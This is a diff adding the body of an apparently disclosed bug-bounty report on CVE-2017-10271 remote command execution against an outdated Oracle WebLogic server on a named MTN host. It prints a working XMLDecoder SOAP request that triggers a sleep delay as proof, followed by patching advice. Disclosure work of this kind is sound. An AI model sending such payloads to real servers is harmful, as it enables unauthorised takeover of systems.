@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "OS Command Injection"
 enriched: true
+body: true
 date: 2021-04-25
 submitted: 2020-03-04T13:45:59.061Z
 bounty_usd: null
@@ -32,6 +33,50 @@ title: "Remote OS Command Execution on Oracle Weblogic server via [CVE-2017-1027
 >
 * Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS Security). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.
 >
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+##Summary
+
+Hello. I was able to identify RCE vulnerability due to the outdated Oracle Weblogic instance on `https://raebilling.mtn.co.za`.
+
+##Steps To Reproduce
+
+* To reproduce, launch this request with BurpSuite
+* This request to the `https://raebilling.mtn.co.za/wls-wsat/CoordinatorPortType` will trigger sleep for 15 seconds (same applies for 20 secondes, 40 seconds):
+
+```
+POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
+Host: raebilling.mtn.co.za
+Content-Length: 426
+content-type: text/xml
+Accept-Encoding: gzip, deflate, compress
+Accept: */*
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java class="java.beans.XMLDecoder">
+        <object class="java.lang.Thread" method="sleep">
+          <long>40000</long>
+        </object>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+```
+==**POC:**== {F736913} {F736912} {F736915}
+
+## Suggested Mitigation/Remediation Actions
+* Patching WebLogic to the recent version will fix the issue.
+
+## Impact
+
+**This vulnerability allow an unauthenticated attacker:**
+* To perform Remote OS Command Execution.
 
 ## Timeline
 
